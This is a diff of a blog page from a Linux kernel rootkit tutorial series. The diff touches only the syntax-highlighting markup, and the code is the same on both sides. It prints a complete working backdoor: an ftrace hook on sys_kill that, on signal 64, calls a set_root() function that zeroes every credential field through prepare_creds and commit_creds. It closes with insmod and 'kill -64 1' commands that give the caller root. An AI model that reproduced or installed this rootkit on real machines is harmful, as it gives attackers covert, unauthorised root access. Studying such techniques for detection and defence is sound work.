@@ -184,78 +184,78 @@ In this first example, we&amp;rsquo;re going to make a rootkit that intercepts c
 <p>Assuming you&rsquo;ve read parts <a href="../linux_rootkits_01">1</a> and <a href="../linux_rootkits_02">2</a>, then you know all about how we&rsquo;re going to hook <code>sys_kill</code> using ftrace and that we&rsquo;ll have two copies of the hook for both the newer <code>pt_regs</code> convention as well as the pre-4.17.0 version. If that doesn&rsquo;t make sense to you, then you might want to revisit the earlier two posts.</p>
 </blockquote>
 <p>This is what our <code>hook_kill</code> function looks like. Note that for most of these posts, I&rsquo;m going to stick to the <code>pt_regs</code> convention (it&rsquo;s very to easy to re-write them for the old way). As always, the full working source is available at the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.3_set_root">repo</a>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
-{
-    <span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
-
-    <span style="color:#66d9ef">int</span> sig <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
-
-    <span style="color:#66d9ef">if</span> (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>)
-    {
-        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-        set_root();
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-
-    <span style="color:#66d9ef">return</span> orig_kill(regs);
-}
-</code></pre></div><p>Notice that we have to pull out the <code>sig</code> argument from the <code>si</code> field of <code>regs</code>. As in <a href="../linux_rootkits_02">Part 2</a>, we get this information from the <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a>, which tells us that <code>sys_kill</code> does indeed expect <code>sig</code> to be placed into the <code>si</code> register when it&rsquo;s called. Another thing to note is that if the signal is <code>64</code>, then nothing is actually sent to any process! In other words, if we want the <code>set_root()</code> function to get called, we&rsquo;ll need to send signal <code>64</code> to <em>something</em>, but that <em>something</em> will never actually receive anything, so it really doesn&rsquo;t matter which PID we choose.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">void</span> set_root(<span style="color:#66d9ef">void</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> sig <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: giving root...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        set_root();
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> orig_kill(regs);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Notice that we have to pull out the <code>sig</code> argument from the <code>si</code> field of <code>regs</code>. As in <a href="../linux_rootkits_02">Part 2</a>, we get this information from the <a href="https://syscalls64.paolostivanin.com/">Linux Syscall Reference</a>, which tells us that <code>sys_kill</code> does indeed expect <code>sig</code> to be placed into the <code>si</code> register when it&rsquo;s called. Another thing to note is that if the signal is <code>64</code>, then nothing is actually sent to any process! In other words, if we want the <code>set_root()</code> function to get called, we&rsquo;ll need to send signal <code>64</code> to <em>something</em>, but that <em>something</em> will never actually receive anything, so it really doesn&rsquo;t matter which PID we choose.</p>
 <p>That&rsquo;s all there is to the syscall hook! Easy, right? The brains of this rootkit actually comes from the <code>set_root()</code> function, which is what we now come to.</p>
 <h1 id="changing-credentials">Changing Credentials<a href="#changing-credentials" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>When attempting to implement some new functionality into the kernel, its always good to check the documentation to see if you can avoid a few headaches. In this case, we come out on top because there is <em>fantastic</em> documentation already prepared for us <a href="https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials">here</a>. As this document informs us, &ldquo;a task can only alter its own credentials, and may not alter those of another task&rdquo;.</p>
 <p>This means that we cannot give arbitrary processes root priveleges, but we <em>can</em> give ourselves root from within an already running process - for example, we should be able to run  <code>kill -64 1</code> (remember - the PID doesn&rsquo;t matter!) from bash, and automagically become root!</p>
 <p>The documentation then tells us that we need a <code>cred</code> struct, and that <code>prepare_creds()</code> will fill this struct with the process&rsquo;s current credentials. Then we can make any changes we want to this struct, before committing them back to the process with <code>commit_creds()</code>. Seems fairly straightforward, right? Roughly, our function will look like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
-{
-    <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
-    root <span style="color:#f92672">=</span> prepare_creds();
-
-    <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
-        <span style="color:#66d9ef">return</span>;
-
-    <span style="color:#75715e">/* Set the credentials to root */</span>
-
-    commit_creds(root);
-}
-</code></pre></div><p>Now we have just have to fill in that middle bit! How do we go about finding the layout of the <code>cred</code> struct in the source? Although I always link to the kernel source on GitHub, the search in GitHub is awful. For this reason, it&rsquo;s best to keep a copy of the kernel source from <a href="https://github.com/torvalds/linux">torvalds</a> on your Vagrant machine - this way, you can just grep for what you&rsquo;re after. In this instance, <code>grep -ir struct\ cred\ {</code> only gives one result: <a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h">include/linux/cred.h</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
+</span></span><span style="display:flex;"><span>    root <span style="color:#f92672">=</span> prepare_creds();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Set the credentials to root */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    commit_creds(root);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now we have just have to fill in that middle bit! How do we go about finding the layout of the <code>cred</code> struct in the source? Although I always link to the kernel source on GitHub, the search in GitHub is awful. For this reason, it&rsquo;s best to keep a copy of the kernel source from <a href="https://github.com/torvalds/linux">torvalds</a> on your Vagrant machine - this way, you can just grep for what you&rsquo;re after. In this instance, <code>grep -ir struct\ cred\ {</code> only gives one result: <a href="https://github.com/torvalds/linux/blob/master/include/linux/cred.h">include/linux/cred.h</a>.</p>
 <p>Down on <a href="https://github.com/torvalds/linux/blob/1127b219ce9481c84edad9711626d856127d5e51/include/linux/cred.h#L111">line 111</a>, we see the following (shortened for clarity):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">struct</span> cred {
-    <span style="color:#75715e">/* redacted */</span>
-
-    kuid_t      uid;    <span style="color:#75715e">/* real UID of the task */</span>
-    kgid_t      gid;    <span style="color:#75715e">/* real GID of the task */</span>
-    kuid_t      suid;   <span style="color:#75715e">/* saved UID of the task */</span>
-    kgid_t      sgid;   <span style="color:#75715e">/* saved GID of the task */</span>
-    kuid_t      euid;   <span style="color:#75715e">/* effective UID of the task */</span>
-    kgid_t      egid;   <span style="color:#75715e">/* effective GID of the task */</span>
-    kuid_t      fsuid;  <span style="color:#75715e">/* UID for VFS ops */</span>
-    kgid_t      fdgid;  <span style="color:#75715e">/* GID for VFS ops */</span>
-
-    <span style="color:#75715e">/* redacted */</span>
-}
-</code></pre></div><p>This looks like what we&rsquo;re after! Another grep, but this time for <code>kuid_t\;</code> again gives only a single result: <a href="https://github.com/torvalds/linux/blob/1127b219ce9481c84edad9711626d856127d5e51/include/linux/uidgid.h#L21">include/linux/uidgid.h</a>. Here we learn that <code>kuid_t</code> is just a struct containing a single field <code>val</code> of type <code>uid_t</code>. The same goes for <code>kgid_t</code>, but <code>val</code> is of type <code>gid_t</code>. (The kernel sure loves its <code>struct</code>s!)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> cred {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* redacted */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    kuid_t      uid;    <span style="color:#75715e">/* real UID of the task */</span>
+</span></span><span style="display:flex;"><span>    kgid_t      gid;    <span style="color:#75715e">/* real GID of the task */</span>
+</span></span><span style="display:flex;"><span>    kuid_t      suid;   <span style="color:#75715e">/* saved UID of the task */</span>
+</span></span><span style="display:flex;"><span>    kgid_t      sgid;   <span style="color:#75715e">/* saved GID of the task */</span>
+</span></span><span style="display:flex;"><span>    kuid_t      euid;   <span style="color:#75715e">/* effective UID of the task */</span>
+</span></span><span style="display:flex;"><span>    kgid_t      egid;   <span style="color:#75715e">/* effective GID of the task */</span>
+</span></span><span style="display:flex;"><span>    kuid_t      fsuid;  <span style="color:#75715e">/* UID for VFS ops */</span>
+</span></span><span style="display:flex;"><span>    kgid_t      fdgid;  <span style="color:#75715e">/* GID for VFS ops */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* redacted */</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This looks like what we&rsquo;re after! Another grep, but this time for <code>kuid_t\;</code> again gives only a single result: <a href="https://github.com/torvalds/linux/blob/1127b219ce9481c84edad9711626d856127d5e51/include/linux/uidgid.h#L21">include/linux/uidgid.h</a>. Here we learn that <code>kuid_t</code> is just a struct containing a single field <code>val</code> of type <code>uid_t</code>. The same goes for <code>kgid_t</code>, but <code>val</code> is of type <code>gid_t</code>. (The kernel sure loves its <code>struct</code>s!)</p>
 <p>Finally, we find that <code>uid_t</code> and <code>gid_t</code> are defined in <a href="https://github.com/torvalds/linux/blob/1127b219ce9481c84edad9711626d856127d5e51/arch/x86/include/asm/compat.h#L20">arch/x86/include/asm/compat.h</a> as just simple <code>u16</code>&rsquo;s (didn&rsquo;t I say that things are almost always just numbers?).</p>
 <blockquote>
 <p>This process of finding some relevant code, then grepping down the rabbit-hole to find the proper definitions of things will come up again and again. It helps to have some idea of how things get defined in C. Don&rsquo;t worry if you wouldn&rsquo;t have come up with those grep searches by yourself - it comes with time and familarity of how kernel objects are constructed.</p>
 </blockquote>
 <p>Seeing as these <code>val</code> fields are just <code>u16</code>s, we should just be able to set them all to <code>0</code> and, after committing them, we should be root!</p>
 <p>Our <code>set_root()</code> function now looks like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
-{
-    <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
-    root <span style="color:#f92672">=</span> prepare_creds();
-
-    <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
-        <span style="color:#66d9ef">return</span>;
-
-    root<span style="color:#f92672">-&gt;</span>uid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>gid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-    root<span style="color:#f92672">-&gt;</span>euid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>egid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-    root<span style="color:#f92672">-&gt;</span>suid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>sgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-    root<span style="color:#f92672">-&gt;</span>fsuid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>fsgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-
-    commit_creds(root);
-}
-</code></pre></div><p>Okay, if you&rsquo;ve been following along, then finish up your hook and the rest of the ftrace business (see <a href="../linux_rootkits_02/">Part 2</a>) - otherwise you can download the completed rookit source <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.3_set_root">here</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">set_root</span>(<span style="color:#66d9ef">void</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> cred <span style="color:#f92672">*</span>root;
+</span></span><span style="display:flex;"><span>    root <span style="color:#f92672">=</span> prepare_creds();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (root <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    root<span style="color:#f92672">-&gt;</span>uid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>gid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    root<span style="color:#f92672">-&gt;</span>euid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>egid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    root<span style="color:#f92672">-&gt;</span>suid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>sgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    root<span style="color:#f92672">-&gt;</span>fsuid.val <span style="color:#f92672">=</span> root<span style="color:#f92672">-&gt;</span>fsgid.val <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    commit_creds(root);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Okay, if you&rsquo;ve been following along, then finish up your hook and the rest of the ftrace business (see <a href="../linux_rootkits_02/">Part 2</a>) - otherwise you can download the completed rookit source <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.3_set_root">here</a>.</p>
 <p>Go ahead and <code>make</code> your kernel module and <code>insmod</code> it. Now simply send signal <code>64</code> to <em>any</em> process, say <code>kill -64 1</code>. Now check <code>id</code> and you&rsquo;ll be root!</p>
 <pre tabindex="0"><code>$ sudo insmod rootkit.ko
 $ kill -64 1
